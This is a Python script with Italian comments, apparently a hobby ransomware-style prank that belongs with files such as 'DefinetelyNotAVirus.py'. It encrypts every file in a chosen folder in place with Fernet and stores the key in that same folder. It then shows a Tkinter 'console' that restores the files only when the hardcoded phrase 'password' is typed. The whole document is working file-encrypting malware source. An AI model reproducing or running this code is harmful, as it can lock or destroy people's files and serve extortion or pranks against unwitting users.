# Documento creato il 27/06/2022

import time
import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet

def crypt_and_decrypt_files():
    # time.sleep(3000)

    untoucchable_files = ["Crypt&Decrypt_Files.py", "DefinetelyNotAVirus.py", "DefinetelyNotAVirus.html", "Timer.css", "Timer.js", "RandomWebsite.py", "Timer.py", "thekey.txt", "Idiot.py", "chromedriver.exe"]
    files = []

    frase_segreta = "password"

    def crypt_files():
        # Se l'utente vuole cryptare i file nella cartella attuale, scrive y (yes)
        # Se invece l'utente desidera cambiare la cartella, seglierà n (no) e inserirà il percorso della stessa
        print("La cartella attuale è: {}".format(os.getcwd()))
        print("I file che vuoi cryptare si trovano in questa cartella?")
        dir = input("[y/n]: ")

        if dir == "y" or dir == "Y":
            print("Hai scelto la cartella corrente.")
            print("La cartella attuale è: {}".format(os.getcwd()))

        elif dir == "n" or dir == "N":
            print("Hai scelto di cambiare cartella.")
            print("Inserisci il percorso della cartella nella quale vuoi cryptare i file.")
            ndir = input(": ")
            os.chdir(ndir)
            print("La cartella attuale è: {}".format(os.getcwd()))

        for file in os.listdir():
            if file in untoucchable_files:
                continue

            elif os.path.isfile(file):
                files.append(file)

        print(files)

        key = Fernet.generate_key()

        with open("thekey.txt", "wb") as k:
            k.write(key)

        for file in files:
            with open(file, "rb") as f:
                contents = f.read()
            contents_encrypted = Fernet(key).encrypt(contents)

            with open(file, "wb") as f:
                f.write(contents_encrypted)

        print("I FILE SONO STATI CRYPTATI!")

    def console_Window():

        def input():
            k = user_input.get()

            if k == frase_segreta:
                
                def decrypt_files():

                    with open("thekey.txt", "rb") as k:
                        key = k.read()

                    for file in files:
                        with open(file, "rb") as f:
                            contents = f.read()
                        contents_decrypted = Fernet(key).decrypt(contents)

                        with open(file, "wb") as f:
                            f.write(contents_decrypted)
            
                        print("I contenuti dei file sono stati decryptati!")

                decrypt_files()

            else:
                messagebox.showinfo(title="Errore!", message="Parola segreta invalida o errata!")

        console = tk.Tk()
        console.geometry("425x200")
        console.title("Console")
        console.resizable(False, False)
        console.configure(background="Black")
    
        l = tk.Label(console, text="<CONSOLE>: ", font=("Consolas 16"), fg="Green", bg="Black")
        l.grid(row=0, column=0)

        user_input = tk.StringVar()
        t1 = tk.Entry(console, textvariable=user_input)
        t1.grid(row=0, column=1)
    
        b = tk.Button(console, text="INVIO!", command=input)
        b.grid(row=1, column=0)

        if __name__ == "__main__":
            console.mainloop()

    crypt_files()

    console_Window()
